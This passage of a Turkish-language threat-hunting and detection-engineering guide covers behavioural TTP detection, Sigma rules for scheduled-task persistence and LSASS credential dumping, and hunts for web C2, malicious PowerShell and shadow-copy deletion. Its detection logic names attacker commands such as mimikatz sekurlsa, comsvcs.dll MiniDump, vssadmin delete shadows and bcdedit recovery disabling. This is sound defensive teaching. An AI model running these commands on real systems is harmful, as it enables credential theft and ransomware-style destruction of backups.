PowerShell'in **script-block logging** (Event ID 4104) özelliği burada altın değerindedir: PowerShell, çalıştırdığı kodu **deobfuscate ederek** loglar → Procedure C'deki registry'den okunan şifreli payload bile, *çalıştırılırken* açık halde 4104'te görünür. Yani komut satırı obfuscate olsa da **çalışan kodun kendisi** loglanır → procedure varyasyonu büyük ölçüde delinir.

> 🔥 **Püf — "obfuscation komut satırını gizler, davranışı gizlemez":** Saldırgan komut satırını sonsuz şekilde karıştırabilir (atomic imzayı öldürür) ama tekniğin **davranışsal izini** (anormal parent, script-block içeriği, ağ çağrısı, AMSI tetiği) gizleyemez. Tespiti **komut satırı string'inden** çıkarıp **davranışsal kombinasyona** taşıdığında, procedure varyasyonu kör noktasını kapatırsın.

### 6.3 Tek teknik–çok procedure tablosu (avcı referansı)

| Teknik | "İmza" procedure (kırılgan) | Davranışsal tespit (dayanıklı) |
|---|---|---|
| **T1003.001** LSASS dump | `mimikatz.exe sekurlsa::` string'i | *Herhangi* bir non-system process'in lsass.exe'ye `PROCESS_VM_READ` ile erişimi (Sysmon EID 10) |
| **T1053.005** Scheduled task | `schtasks.exe /create` komut satırı | Yeni görev kaydı olayı (EID 4698) + şüpheli action yolu |
| **T1547.001** Run key | `reg add ...\Run` string'i | Run anahtarına *yazma* (Sysmon EID 13) + şüpheli değer |
| **T1490** Inhibit recovery | `vssadmin delete shadows` string'i | shadow copy/backup silme *davranışı* (vssadmin/wmic/wbadmin/PowerShell hepsinde) |
| **T1218.011** rundll32 LOLBin | tam `rundll32 comsvcs.dll` satırı | rundll32'nin anormal parent/ağ/bellek davranışı |

> 🧠 **Altın kural:** **"Procedure'ı değil, tekniği avla."** Bir procedure'a (tam komut, tam araç adı) yazılan tespit **atomic ve kırılgandır** — aktör procedure'unu değiştirince çöker. Tekniğin **değişmez davranışsal çekirdeğine** yazılan tespit **behavioral ve dayanıklıdır** — tüm procedure varyasyonlarını (ve henüz icat edilmemiş olanları) yakalar. Bu, bir sonraki bölümün (atomic vs behavioral) tam konusudur.

---

<a id="7"></a>
## 7. 🔥 TTP TABANLI TESPİT — Atomic'ten Behavioral'a (Detection Engineering)

Bu bölüm, kavramı **mühendisliğe** çevirir: bir TTP'yi **nasıl tespit edersin?** IOC imzasından davranış tespitine geçişin pratiğidir.

### 7.1 Atomic vs Behavioral tespit — temel ayrım

| Boyut | **Atomic detection** | **Behavioral detection** |
|---|---|---|
| **Neye bakar** | Tek, kendi başına anlamlı gösterge (bir hash, bir IP, bir string) | Bir *davranış deseni* / olaylar kombinasyonu |
| **Örnek** | "`evil.exe` hash'i görüldü" | "Office process'i, gizli bayraklı PowerShell başlattı, o da dış bağlantı açtı" |
| **Pyramid yeri** | Alt (hash/IP/domain) | Üst (TTP) |
| **Dayanıklılık** | Kırılgan | Dayanıklı |
| **FP riski** | Düşük | Daha yüksek (bağlam şart) |

**Atomic:** "Şu göstergeyi gördüysen alarm ver." Hızlı, kesin, ama dar. **Behavioral:** "Şu olaylar *birlikte/sırayla* olduysa alarm ver." Geniş, dayanıklı, ama bağlam ve ayar ister.

### 7.2 Bir tekniği nasıl tespit edersin — evrensel reçete

Her TTP tespiti aynı zinciri izler:

```
   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐
   │ 1. TEKNİK    │──►│ 2. DATA      │──►│ 3. LOG/OLAY  │──►│ 4. KURAL     │
   │ (ne avlanır) │   │ SOURCE       │   │ (somut iz)   │   │ (Sigma/EDR)  │
   │ T1053.005    │   │ process      │   │ EID 4698,    │   │ logsource +  │
   │              │   │ creation +   │   │ schtasks.exe │   │ detection +  │
   │              │   │ task reg.    │   │ komut satırı │   │ condition    │
   └──────────────┘   └──────────────┘   └──────────────┘   └──────────────┘
```

1. **Teknik:** Neyi avlayacağını ATT&CK ID ile netleştir (T1053.005).
2. **Data source:** O tekniği *hangi telemetri* görür? (process creation, command-line, task registration — Bölüm 10).
3. **Log/olay:** Somut iz hangi log satırında? (Windows EID 4698 "task created", ya da Sysmon EID 1 ile `schtasks.exe` komut satırı).
4. **Kural:** Bu izi bir tespit kuralına (Sigma → SIEM) dök (Bölüm 8).

### 7.3 🔥 ÇÖZÜMLÜ ÖRNEK 1 — T1053.005 Scheduled Task Tespiti

```
┌──────────────────────────────────────────────────────────────────────────┐
│  ÇÖZÜMLÜ TESPİT: T1053.005 — Scheduled Task ile Persistence                │
├──────────────────────────────────────────────────────────────────────────┤
│  TEKNİK     │ Saldırgan, reboot'a dayanmak için zamanlanmış görev kurar.   │
│  DATA SRC   │ (a) Process creation + command-line  (b) Scheduled task log  │
│  LOG/OLAY   │ • Windows Security EID 4698 = "A scheduled task was created" │
│             │   → görev adı, komut (Task XML), oluşturan kullanıcı         │
│             │ • Sysmon EID 1 = process creation → schtasks.exe komut satırı│
│             │   (örn. schtasks /create /sc onlogon /tr C:\...\evil.exe)    │
│             │ • PowerShell EID 4104 → Register-ScheduledTask script-block  │
│  AVLAMA     │ Şüphe işaretleri:                                            │
│  MANTIĞI    │  - Action yolu %TEMP%/%APPDATA%/genel-yazılabilir dizinde    │
│             │  - Trigger: onlogon / onstart / kısa periyot (dakikalık)     │
│             │  - Görev adı meşru (svchost/Update) taklidi (masquerading!)  │
│             │  - Oluşturan parent anormal (winword, powershell, wmic)      │
│  ATOMIC vs  │ ATOMIC: "schtasks.exe /create" string'i → schtasks kullanan  │
│  BEHAVIORAL │  her şeyi yakalar ama Register-ScheduledTask'ı KAÇIRIR + çok │
│             │  FP (meşru yazılım da görev kurar).                          │
│             │ BEHAVIORAL: "görev oluşturuldu (EID 4698) VE action yolu     │
│             │  şüpheli dizinde VE parent anormal" → procedure-bağımsız,    │
│             │  düşük FP. İşte TTP tespiti budur.                           │
└──────────────────────────────────────────────────────────────────────────┘
```

> **Not (teyit et):** EID 4698 için **"Audit Other Object Access Events"** denetiminin açık olması gerekir; varsayılan olarak kapalı olabilir. Bu, bir **detection coverage** boşluğu örneğidir (Bölüm 10): denetim açık değilse 4698 hiç üretilmez ve bu tespit **kör** kalır → o zaman Sysmon EID 1 (schtasks.exe komut satırı) yedek görünürlük sağlar.

### 7.4 🔥 ÇÖZÜMLÜ ÖRNEK 2 — T1003.001 LSASS Dumping Tespiti

```
┌──────────────────────────────────────────────────────────────────────────┐
│  ÇÖZÜMLÜ TESPİT: T1003.001 — LSASS Belleğinden Kimlik Bilgisi Çalma        │
├──────────────────────────────────────────────────────────────────────────┤
│  TEKNİK     │ Saldırgan lsass.exe belleğinden parola/hash/ticket çeker.    │
│             │ (Mimikatz, procdump, comsvcs.dll MiniDump, özel araç...)     │
│  DATA SRC   │ Process access (handle açma) + process creation              │
│  LOG/OLAY   │ • Sysmon EID 10 = "ProcessAccess" → bir process lsass.exe'ye │
│             │   handle açtı. Kritik alanlar:                              │
│             │     TargetImage = C:\Windows\System32\lsass.exe              │
│             │     GrantedAccess = 0x1010 / 0x1410 / 0x1438 (VM_READ içerir)│
│             │     SourceImage  = erişen process (= şüpheli)               │
│             │ • Sysmon EID 1 → procdump/rundll32 comsvcs.dll komut satırı  │
│             │ • Windows EID 4656/4663 (lsass nesnesine erişim — SACL ile)  │
│  AVLAMA     │ • SourceImage system olmayan/yabancı bir process mı?         │
│  MANTIĞI    │   (meşru: wininit, csrss, AV/EDR; şüpheli: powershell,       │
│             │    rundll32, taskmgr-dışı dump araçları, bilinmeyen exe)    │
│             │ • GrantedAccess okuma izni içeriyor mu (0x10 = VM_READ)?     │
│             │ • Procedure-bağımsız: Mimikatz da procdump da comsvcs de     │
│             │   AYNI EID 10 izini bırakır → TTP tespiti hepsini yakalar   │
│  ATOMIC vs  │ ATOMIC: "mimikatz.exe" adı / sekurlsa string'i → yeniden     │
│  BEHAVIORAL │  adlandırılınca (mim.exe) KÖR.                              │
│             │ BEHAVIORAL: "lsass.exe'ye VM_READ ile erişen yabancı        │
│             │  process" → aracı/adı umursamaz, TEKNİĞİ yakalar. 😈 TTP.    │
│  FP/AYAR    │ Meşru erişenleri whitelist'le (AV/EDR ajanları, Windows     │
│             │  bileşenleri) → aksi halde alert yorgunluğu (Bölüm 12).      │
└──────────────────────────────────────────────────────────────────────────┘
```

> 🧠 **Bu iki örneğin dersi:** Her ikisinde de **atomic (string/araç adı) tespit kırılgan**, **behavioral (davranış+bağlam) tespit dayanıklıdır.** Behavioral tespit, *tekniğin doğasını* yakalar — saldırgan aracını, adını, komutunu değiştirse de teknik aynı izi bırakır. Detection engineering'in özü budur: **"imzayı değil, davranışı kodla."**

### 7.5 Tespit olgunluk merdiveni

```
   Seviye 0: Tespit yok / sadece AV imzası
   Seviye 1: Atomic IOC (hash/IP/domain blocklist)
   Seviye 2: Araç imzası (YARA — Mimikatz, Cobalt Strike byte'ları)
   Seviye 3: Tek-teknik behavioral (LSASS erişimi, anormal scheduled task)
   Seviye 4: Çok-teknik korelasyon (kill-chain: access→cred→lateral zinciri)
   Seviye 5: Hipotez-tabanlı proaktif hunting + sürekli detection engineering
        ▲ olgunluk artar — IOC'den TTP'ye, reaktiften proaktife
```

> 🔥 **Püf — "her şeyi tespit" yanılgısı:** Hedef, *her tekniği* tespit etmek **değildir** (imkânsız ve sonu alert yorgunluğu). Hedef, **aktörün zincirinde kritik, kaçınılması zor "boğaz noktalarını"** (chokepoints) tespit etmektir — örn. LSASS erişimi, anormal parent-child zinciri, log silme. Saldırganın *atlamak zorunda* kaldığı dar geçitleri tutarsan, az kuralla çok yakalarsın. "Genişlik değil, doğru yerde derinlik."

---

<a id="8"></a>
## 8. 🔥 SIGMA KURALLARI — TTP'yi Platform-Bağımsız Tespite Çevirmek

Bir TTP'yi tespit *mantığı* olarak tasarladın (Bölüm 7) — peki bunu **her SIEM'de çalışacak** bir kurala nasıl dökeceksin? Cevap: **Sigma.**

### 8.1 Sigma nedir, neden devrim

**Sigma**, log tespit kuralları için **platform-bağımsız, YAML tabanlı bir standarttır** ("log'lar için YARA" diye anılır — Florian Roth/Thomas Patzke). Bir kuralı **bir kez** Sigma'da yazarsın → bir **çevirici** (sigma-cli / pySigma) onu Splunk SPL'e, Elastic/ELK (Lucene/EQL) sorgusuna, Microsoft Sentinel KQL'ine, QRadar'a vb. **otomatik dönüştürür.** Böylece tespit bilgisi **SIEM'e kilitlenmez** ve topluluk kuralları (SigmaHQ reposu) paylaşılabilir.

```
              ┌────────────────────┐
              │   SIGMA KURALI     │  (tek YAML — platform-bağımsız)
              │  logsource +       │
              │  detection +       │
              │  condition         │
              └─────────┬──────────┘
                        │  sigma-cli / pySigma (backend çevirici)
        ┌───────────────┼────────────────┬─────────────────┐
        ▼               ▼                ▼                 ▼
   Splunk (SPL)    Elastic (EQL/    Sentinel (KQL)    QRadar / others
                   Lucene)
```

### 8.2 Sigma anatomisi (logsource / detection / condition)

Bir Sigma kuralının üç kritik bölümü:

- **`logsource:`** — Kuralın *hangi log türüne* uygulanacağı (örn. `product: windows`, `category: process_creation`). Çevirici bunu doğru index/sourcetype'a eşler.
- **`detection:`** — Aranacak alanlar ve değerler (bir veya daha fazla *selection* bloğu). Asıl desen burada.
- **`condition:`** — Selection'ların *nasıl birleşeceği* (Boolean mantık: `selection and not filter`). Kuralın zekâsı burada.

### 8.3 🔥 TAM KURAL ÖRNEĞİ 1 — T1053.005 Scheduled Task (komut satırından)

```yaml
title: Şüpheli Scheduled Task Oluşturma (schtasks)
id: 9b2f1e44-0c3a-4e7d-8a21-ttp-örnek-0001        # teyit et: gerçek UUID üret
status: experimental
description: >
  schtasks.exe ile, action yolu kullanıcı-yazılabilir bir dizinde olan
  zamanlanmış görev oluşturulmasını tespit eder (T1053.005 persistence).
references:
  - https://attack.mitre.org/techniques/T1053/005/
author: avci
date: 2026/05/31
tags:
  - attack.persistence
  - attack.t1053.005
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\schtasks.exe'
    CommandLine|contains|all:
      - '/create'
      - '/tr'
  suspicious_path:
    CommandLine|contains:
      - '\AppData\'
      - '\Temp\'
      - '\ProgramData\'
      - '\Public\'
      - 'powershell'
      - 'cmd /c'
  filter_legit:
    # bilinen meşru kurulumcuları dışla (FP azaltma — kendi ortamına göre genişlet)
    ParentImage|endswith:
      - '\msiexec.exe'
      - '\TrustedInstaller.exe'
  condition: selection and suspicious_path and not filter_legit
falsepositives:
  - Meşru kurulum/güncelleme görevleri (filter ile dışla)
  - Yönetici otomasyon script'leri
level: high
```

**Bu kural neden "TTP tespiti":** `schtasks.exe` + `/create` + `/tr` **tekniği** yakalar; *şüpheli yol* koşulu ile aileyi daraltır; `filter_legit` ile meşru procedure'ları dışlar. Aktör görev adını değiştirse de, action'ı şüpheli bir yolda çalıştırdığı sürece yakalanır. (Register-ScheduledTask procedure'unu da yakalamak için ayrı bir kural — PowerShell script-block / EID 4698 logsource'u ile — yazılır; tek kural her procedure'ı kapsamaz, bu yüzden **kural seti** gerekir.)

### 8.4 🔥 TAM KURAL ÖRNEĞİ 2 — T1003.001 LSASS Erişimi (Sysmon EID 10)

```yaml
title: LSASS Belleğine Şüpheli Erişim (Credential Dumping)
id: 3a7c5d12-8e4b-4f90-b6a2-ttp-örnek-0002        # teyit et: gerçek UUID üret
status: experimental
description: >
  Sistem olmayan bir process'in lsass.exe'ye okuma izniyle (VM_READ)
  handle açmasını tespit eder. Mimikatz/procdump/comsvcs.dll dahil tüm
  LSASS dump procedure'larını davranışsal olarak yakalar (T1003.001).
references:
  - https://attack.mitre.org/techniques/T1003/001/
author: avci
date: 2026/05/31
tags:
  - attack.credential_access
  - attack.t1003.001
logsource:
  category: process_access        # Sysmon Event ID 10
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|contains:
      - '0x1010'      # PROCESS_VM_READ içeren yaygın maskeler
      - '0x1410'
      - '0x1438'
      - '0x143a'
      - '0x1fffff'    # PROCESS_ALL_ACCESS
  filter_known_good:
    SourceImage|endswith:
      - '\wininit.exe'
      - '\csrss.exe'
      - '\services.exe'
      - '\MsMpEng.exe'           # Defender
      - '\wmiprvse.exe'
    # NOT: kendi EDR/AV ajanını da buraya ekle, yoksa sürekli alarm
  condition: selection and not filter_known_good
falsepositives:
  - Meşru güvenlik ürünleri (AV/EDR) — filter ile dışlanmalı
  - Bazı sistem bileşenleri ve yedekleme yazılımları
level: high
```

**Bu kuralın gücü:** `SourceImage`'a (araç adına) **bağlı değil** — `TargetImage = lsass.exe` + okuma izni + "bilinen-iyi değil" mantığıyla **tekniği** yakalar. Mimikatz'ı `mim.exe`'ye yeniden adlandırsan, procdump kullansan ya da comsvcs.dll ile dump alsan **fark etmez** → hepsi lsass'a VM_READ ile erişir. 😈 Bu, Pyramid'in **TTP** seviyesinde bir tespittir.

### 8.5 Sigma → SIEM dönüşümü (pratik)

```bash
# sigma-cli (pySigma) ile dönüştürme — kuralı SIEM sorgusuna çevir
# (sürüm/backend adları değişebilir — teyit et: github.com/SigmaHQ/sigma-cli)

# Splunk SPL üret:
sigma convert -t splunk -p sysmon kural_lsass.yml

# Elastic (Lucene) üret:
sigma convert -t lucene -p ecs_windows kural_lsass.yml

# Microsoft Sentinel (KQL) üret:
sigma convert -t kusto -p sysmon kural_lsass.yml
```

- **`-p` (pipeline):** Alan adlarını hedef şemaya eşler (örn. Sysmon → ECS). Yanlış pipeline = yanlış/boş sorgu → **doğru pipeline kritik.**
- **Doğrulama:** Üretilen sorguyu SIEM'de **bilinen bir test verisinde** çalıştır (Atomic Red Team ile teknik üretip — Bölüm 15 — tespitin gerçekten ateşlendiğini gör).

> 🔥 **Püf — Sigma kuralı bakımı:** Bir Sigma kuralı "yaz-unut" değildir. (1) **Alan adları** SIEM/şema güncellemesiyle değişir → pipeline'ı güncel tut. (2) **False positive'ler** ortamına göre birikir → `filter` bloklarını sürekli geliştir. (3) **Yeni procedure'lar** çıkar → kuralı genişlet ya da kardeş kural ekle. (4) Topluluk kuralını (SigmaHQ) körü körüne alma — **kendi ortamında test et ve uyarla** (başka bir ortamın meşru aracı seninkinde FP yaratabilir). Test edilmemiş/bakımsız Sigma kuralı, ya kör kalır ya da SOC'u gürültüye boğar — ikisi de güveni yıkar.

---

<a id="9"></a>
## 9. 🔥 THREAT HUNTING — Hipotez-Tabanlı TTP Avı (Çözümlü Örnekler)

Tespit kuralları (Sigma) **bilineni** otomatik yakalar. **Threat hunting** ise *kuralların kaçırdığını* **proaktif, insan-yönlü** arayıştır: "Henüz alarm çalmadı ama acaba aktör burada mı?" Bu, savunmanın **proaktif** yüzüdür.

### 9.1 Hipotez-tabanlı avlanma döngüsü

```
   ┌─────────────────────────────────────────────────────────────────┐
   │  1. HİPOTEZ KUR                                                  │
   │     "Varsayalım aktör T1071.001 (web C2) kullanıyor olabilir."  │
   │     Kaynak: ATT&CK tekniği, tehdit raporu, sektör istihbaratı,  │
   │     'crown jewel' riski, bir önceki olayın dersi                │
   └────────────────────────────┬────────────────────────────────────┘
                                 ▼
   ┌─────────────────────────────────────────────────────────────────┐
   │  2. VERİ KAYNAĞINI BELİRLE                                       │
   │     T1071.001'i ne görür? → proxy/DNS/firewall logları,         │
   │     Sysmon EID 3 (network), TLS metadata (JA3/SNI)              │
   └────────────────────────────┬────────────────────────────────────┘
                                 ▼
   ┌─────────────────────────────────────────────────────────────────┐
   │  3. SORGU MANTIĞINI YAZ & ÇALIŞTIR                               │
   │     Beacon imzası ara: düzenli aralık + sabit küçük boyut +     │
   │     nadir/yeni domain + anormal User-Agent                     │
   └────────────────────────────┬────────────────────────────────────┘
                                 ▼
   ┌─────────────────────────────────────────────────────────────────┐
   │  4. BULGUYU DEĞERLENDİR                                          │
   │     Aday var mı? → araştır (gerçek tehdit / meşru / FP?)        │
   └────────────────────────────┬────────────────────────────────────┘
                                 ▼
   ┌─────────────────────────────────────────────────────────────────┐
   │  5. SONUÇLANDIR & OTOMATİKLEŞTİR                                 │
   │     Tehdit bulundu → olay müdahalesi.                          │
   │     Bulundu/bulunmadı farketmez → avı bir SIGMA KURALINA çevir  │
   │     (bir daha elle aramayasın). Hipotezi rafine et, tekrarla.   │
   └─────────────────────────────────────────────────────────────────┘
```

> 🧠 **ATT&CK = hipotez fabrikası:** "Ne arayacağımı nereden bilirim?" sorusunun cevabı ATT&CK'tir. Bir aktörün/sektörün **kullandığı bilinen teknikleri** (Navigator katmanı → `MITRE_ATTACK_USTALIK_REHBERI.md`) alıp her birini bir **av hipotezine** çevirirsin: "Bu teknik bizde olsaydı, hangi izi bırakırdı, o iz bende var mı?" Böylece av rastgele değil, **istihbarat-yönlü** olur.

### 9.2 🔥 ÇÖZÜMLÜ HUNT 1 — T1071.001 Web C2 Beacon

```
┌──────────────────────────────────────────────────────────────────────────┐
│  HUNT 1 — Hipotez: "Bir host, web protokolü üzerinden C2 beacon atıyor."  │
├──────────────────────────────────────────────────────────────────────────┤
│  TEKNİK     │ T1071.001 (Application Layer Protocol: Web Protocols)        │
│  HİPOTEZ    │ Bir cihaz, düzenli aralıklarla (beacon) nadir bir dış        │
│             │ hedefe küçük HTTP(S) istekleri yapıyor olabilir.            │
│  VERİ KAYNAĞI│ Proxy/web-gateway logları, firewall flow, DNS logları,     │
│             │ Sysmon EID 3 (network connect), TLS JA3/SNI                 │
│  SORGU      │ • Hedef-domain bazında grupla; her host→domain çifti için:  │
│  MANTIĞI    │   - istek zaman damgaları arasındaki ARALIĞIN düşük varyansı│
│             │     (düzenlilik = beacon; insan trafiği düzensizdir)        │
│             │   - küçük, SABİT boyutlu istek/yanıt (check-in paketleri)   │
│             │   - domain YAŞI yeni / nadir görülen / DGA-benzeri          │
│             │   - anormal/eksik User-Agent, garip URI yolu (/gate.php)    │
│             │ • "Beaconing score" üret: aralık-düzenliliği + nadirlik     │
│  BULGU      │ Aday host bulundu → process'i bul (Sysmon EID 1/3 ile hangi │
│  DEĞERLEND. │ exe bağlanıyor?). Meşru mu (telemetri/güncelleme) yoksa     │
│             │ bilinmeyen process mü? → bilinmeyense → olay müdahalesi.    │
│  SONUÇ      │ Bulunsa da bulunmasa da: "beaconing score" mantığını bir    │
│             │ Sigma/SIEM kuralına çevir → sürekli otomatik tara.          │
└──────────────────────────────────────────────────────────────────────────┘
```

> 💡 **Püf:** Beacon avının altın sinyali **aralığın düzenliliğidir** (jitter olsa bile istatistiksel olarak tespit edilir). İçeriği şifreli (TLS) olsa da **metadata** (zamanlama, boyut, hedef nadirliği, JA3) C2'yi ele verir — şifreleme davranışı gizlemez.

### 9.3 🔥 ÇÖZÜMLÜ HUNT 2 — T1059.001 Anormal Parent → PowerShell

```
┌──────────────────────────────────────────────────────────────────────────┐
│  HUNT 2 — Hipotez: "Bir Office/script process'i, kötücül PowerShell      │
│           başlattı (makro-tabanlı initial access/execution)."            │
├──────────────────────────────────────────────────────────────────────────┤
│  TEKNİK     │ T1059.001 (PowerShell) + T1566 (Phishing tetikleyici)       │
│  HİPOTEZ    │ winword/excel/outlook gibi bir uygulama, child olarak       │
│             │ powershell.exe başlattıysa → makro/exploit ile kod çalıştı. │
│  VERİ KAYNAĞI│ Sysmon EID 1 (process creation: Parent/Child + komut),     │
│             │ PowerShell EID 4104 (script-block — deobfuscate içerik)     │
│  SORGU      │ • ParentImage ∈ {winword,excel,powerpnt,outlook,mshta,      │
│  MANTIĞI    │   wscript,cscript} VE ChildImage = powershell.exe/pwsh.exe  │
│             │ • Komut satırında: -enc / -e / hidden / -nop / DownloadString│
│             │   / FromBase64String / IEX  (procedure işaretleri)         │
│             │ • 4104 script-block'unda: ağ çağrısı, encode, AMSI bypass   │
│  BULGU      │ Eşleşme bulundu → o host'ta zinciri genişlet: powershell    │
│  DEĞERLEND. │ ne yaptı? (dropped dosya, registry Run yazımı = persistence,│
│             │ dış bağlantı = C2). Tek bulgu → tüm kill-chain'i çıkar.     │
│  SONUÇ      │ Bu kombinasyon neredeyse her zaman kötücül → yüksek-isabet  │
│             │ bir Sigma kuralına dönüştür; düşük FP, yüksek değer.        │
└──────────────────────────────────────────────────────────────────────────┘
```

### 9.4 🔥 ÇÖZÜMLÜ HUNT 3 — T1490 Inhibit System Recovery (fidye öncesi)

```
┌──────────────────────────────────────────────────────────────────────────┐
│  HUNT 3 — Hipotez: "Bir aktör, fidye öncesi shadow copy/yedekleri        │
│           siliyor (kurtarmayı engelleme)."                               │
├──────────────────────────────────────────────────────────────────────────┤
│  TEKNİK     │ T1490 (Inhibit System Recovery)                             │
│  HİPOTEZ    │ Bir process, sistem geri-yükleme/shadow copy/yedekleri      │
│             │ siliyorsa → fidye saldırısının "Impact" hazırlığı.         │
│  VERİ KAYNAĞI│ Sysmon EID 1 (process+komut), Windows EID 4688            │
│  SORGU      │ Komut satırında ŞU DAVRANIŞLARDAN herhangi biri (procedure  │
│  MANTIĞI    │ -bağımsız — hepsi aynı tekniği yapar):                     │
│             │   - vssadmin delete shadows / resize shadowstorage          │
│             │   - wmic shadowcopy delete                                  │
│             │   - wbadmin delete catalog / delete systemstatebackup       │
│             │   - bcdedit /set recoveryenabled no                         │
│             │   - PowerShell Get-WmiObject Win32_ShadowCopy | ... Delete   │
│  BULGU      │ Bu komutlar MEŞRU yönetimde NADİRDİR → eşleşme = yüksek      │
│  DEĞERLEND. │ öncelikli alarm. Hemen host'u izole et, kill-chain'i tara   │
│             │ (genelde lateral movement + cred access ÖNCEsinde olmuştur).│
│  SONUÇ      │ Bu, fidyenin "son uyarısıdır" → tespit edilirse şifreleme   │
│             │ başlamadan dakikalar içinde müdahale şansı. Kritik kural.   │
└──────────────────────────────────────────────────────────────────────────┘
```

### 9.5 Hunting maturity (avlanma olgunluğu)

Sqrrl'in **Hunting Maturity Model (HMM)** beş seviyedir (teyit et):

```
   HMM0 — Initial:   Sadece otomatik alarmlara güvenir; av yok.
   HMM1 — Minimal:   IOC arama yapar (feed'lerden), düşük seviye.
   HMM2 — Procedural: Başkalarının prosedürlerini uygular (hazır hunt'lar).
   HMM3 — Innovative: KENDİ hipotezlerini üretir, yeni analitikler yazar.
   HMM4 — Leading:    Avların ÇOĞUNU otomatikleştirir; insan en zor vakalara odaklanır.
        ▲ olgunluk: IOC aramadan → hipotez üreten + otomatikleştiren ekibe
```

> 🧠 **Altın kural:** Avın çıktısı **her zaman bir kurala dönüşmelidir.** Bir tehdidi elle bulduysan harika — ama onu bir Sigma/SIEM kuralına çevirmezsen, **yarın yine elle araman gerekir.** Olgun hunting, "bul → otomatikleştir → bir sonraki daha zor hipoteze geç" döngüsüdür. **Av, kalıcı tespite dönüşmeden tamamlanmış sayılmaz.**

---

<a id="10"></a>
## 10. 📡 DATA SOURCES — Hangi Log Hangi Tekniği Görür (& Coverage)

Bir tekniği tespit edebilmenin ön koşulu, onu **görebilen telemetriye** sahip olmaktır. ATT&CK her tekniğe **data source**'lar atar — "bu tekniği hangi veri görür?" TTP avcılığında en sinsi tuzak budur: **göremediğin tekniği avlayamazsın.**

### 10.1 Kritik data source → teknik eşlemesi

| Data Source | Somut log/araç | Hangi teknikleri görür (örnek) |
|---|---|---|
| **Process Creation** | Sysmon EID 1, Windows EID 4688 | Execution (T1059), LOLBin (T1218), keşif komutları (T1057/T1082), schtasks (T1053) |
| **Command-Line** | Sysmon EID 1 (CommandLine), 4688 (denetim açıksa) | Procedure detayı: `-enc`, `vssadmin delete`, download cradle — **çoğu TTP'nin kalbi** |
| **Process Access** | Sysmon EID 10 | Credential dumping (T1003.001 LSASS), process injection (T1055) |
| **Network Connection** | Sysmon EID 3, firewall/proxy/flow | C2 (T1071), exfil (T1041), lateral (T1021) |
| **DNS Query** | Sysmon EID 22, DNS server logları | C2 domain, DGA, DNS tüneli (T1071.004) |
| **File Creation/Mod** | Sysmon EID 11, dosya denetimi | Dropped payload, ransomware şifreleme izi, staging (T1074) |
| **Registry** | Sysmon EID 12/13/14, EID 4657 | Persistence (T1547.001 Run), config saklama, defense evasion |
| **Image/Module Load** | Sysmon EID 7 | DLL side-loading (T1574.002), şüpheli modül yükleme |
| **Scheduled Task** | Windows EID 4698/4699/4700/4702 | T1053.005 (oluşturma/değiştirme/silme) |
| **Authentication** | Windows EID 4624/4625/4768/4769 | Lateral movement, pass-the-hash, Kerberoast (T1558.003), brute force |
| **PowerShell** | EID 4103 (module), 4104 (script-block) | T1059.001 — **obfuscation'ı deobfuscate ederek loglar** |
| **WMI** | Sysmon EID 19/20/21 | WMI persistence (T1546.003), WMI lateral (T1047) |

### 10.2 🔥 Detection coverage — "neyi göremezsin"

**Coverage** = sahip olduğun data source'ların kapsadığı teknik yüzdesi. Kör noktalar ölümcüldür:

```
   ┌─────────────────────────────────────────────────────────────────┐
   │  GÖREBİLDİĞİN (yeşil)         │  GÖREMEDİĞİN (kör nokta)         │
   ├─────────────────────────────────────────────────────────────────┤
   │  Sysmon kurulu → process,     │  Sysmon YOK → çoğu host TTP'si  │
   │  network, registry, EID 10    │  görünmez (en büyük boşluk)     │
   │                               │                                  │
   │  PowerShell 4104 açık →       │  4104 KAPALI → obfuscate edilmiş│
   │  script-block deobfuscate     │  PowerShell tamamen kör         │
   │                               │                                  │
   │  Komut satırı denetimi açık → │  4688 komut-satırı KAPALI →     │
   │  procedure detayı görünür     │  "ne komut çalıştı" görünmez    │
   │                               │                                  │
   │  4698 denetimi açık →         │  Object Access denetimi kapalı →│
   │  scheduled task görünür       │  görev oluşturma kör (sadece    │
   │                               │  schtasks.exe komut satırı kalır)│
   └─────────────────────────────────────────────────────────────────┘
```

### 10.3 Coverage'ı görünür kılma — ATT&CK ile haritalama

ATT&CK matrisini bir **kapsama haritası** olarak kullan (Navigator ile — detay `MITRE_ATTACK_USTALIK_REHBERI.md`): her tekniği "görebiliyor muyum? tespit edebiliyor muyum?" diye renklendir → **yeşil = kapsanan, kırmızı = kör nokta.** Kırmızı bölgeler, saldırganın **görünmeden** geçebileceği koridorlardır → öncelikle oraları kapatacak telemetriyi devreye al. (DeTT&CT ve ATT&CK Navigator bu haritalamayı kolaylaştırır — teyit et.)

> 🔥 **Püf — "tespit, görünürlük kadardır":** En zekice Sigma kuralı bile, beslendiği log yoksa **boşa yazılmıştır.** Detection engineering'in **birinci adımı kural yazmak değil, görünürlüğü sağlamaktır:** Sysmon (iyi bir konfigle — örn. SwiftOnSecurity şablonu), PowerShell script-block logging, komut-satırı denetimi (4688), gerekli object-access denetimleri. **Önce "görebiliyor muyum?", sonra "tespit ediyor muyum?".** Bir teknik için coverage yoksa, o teknik senin için *yokmuş gibi davranır* — ve aktör tam oradan girer.

---

<a id="11"></a>
## 11. 🔍 TTP ve Atfetme — İmza, Overlap, Copy-Cat Tehlikesi

TTP'ler yalnızca tespit için değil, **atfetme** (attribution — "bu kim?") için de kullanılır. Bir aktörün TTP "imzası", parmak izi gibi onu ele verebilir.

### 11.1 TTP'nin atfetmedeki rolü (özet — detay MITRE dosyasında)

Aktörler genelde **alıştıkları oyun kitabını** tekrarlar: aynı persistence yöntemi, aynı C2 framework'ü, aynı araç tercihleri, aynı operasyonel saatler, aynı kodlama alışkanlıkları. Bu **TTP kombinasyonu**, IOC'lerden çok daha kalıcı bir aktör imzasıdır (Pyramid of Pain mantığı: aktör IP/domain'ini değiştirir ama *çalışma tarzını* zor değiştirir). ATT&CK'in **Groups** kataloğu (örn. APT29, FIN7) her aktörü kullandığı tekniklerle profiller — *bir saldırıda gözlemlediğin teknik setini bu profillerle karşılaştırarak* olası aktöre yaklaşırsın.

> 🧭 **Aktör belirleme, Navigator katman karşılaştırması, grup-teknik eşlemesi ve rapor üretimi → `MITRE_ATTACK_USTALIK_REHBERI.md`.** Burada yalnızca atfetmenin **kavramsal tuzaklarını** ele alıyoruz.

### 11.2 🔥 TTP overlap ve copy-cat tehlikesi

Atfetmenin en büyük tuzağı: **TTP benzerliği ≠ kesin atfetme.** Üç tehlike:

